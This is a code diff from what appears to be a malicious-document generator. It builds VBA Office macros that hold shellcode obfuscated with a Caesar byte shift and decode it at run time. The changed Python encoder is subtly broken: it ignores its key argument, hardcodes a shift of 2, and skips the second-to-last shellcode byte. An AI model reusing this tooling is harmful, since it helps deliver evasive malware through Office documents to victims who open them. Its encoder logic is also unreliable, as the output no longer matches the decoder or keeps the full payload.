@@ -25,6 +25,7 @@ Function MyMacro()
   End If
 
   buf = Array(%s)
+  
   For i = 0 To UBound(buf) 
     buf(i) = buf(i) - %s
   Next i
@@ -183,11 +184,13 @@ def format_shellcode_caesar(shellcode, k):
     hshellcode = ""
     code_size = len(shellcode)                                                                                                                                                                                                                                                                                                                                                                       
     for num, byte in enumerate(shellcode):       
-        if num%25 == 0 and num != 0: hshellcode += " _\n";continue                                                                                                                                                                                                                                                                                                                                                    
-        if num != code_size - 1: 
-            hshellcode += f" {byte+k},"
-        else: 
-            hshellcode += f"{byte+k}"
+        if num%50 == 0 and num != 0: hshellcode += "_\n";                                                                                                                                                                                                                                                                                                                                           
+        if num == 0: # first
+            hshellcode += f"{byte+2}, "
+        if num > 0 and num < code_size -2: # middle
+            hshellcode += f"{byte+2}, "
+        if num == code_size - 1: # last
+            hshellcode += f"{byte+2}"
     return hshellcode
 
 def format_shellcode_for_xlm4(shellcode):
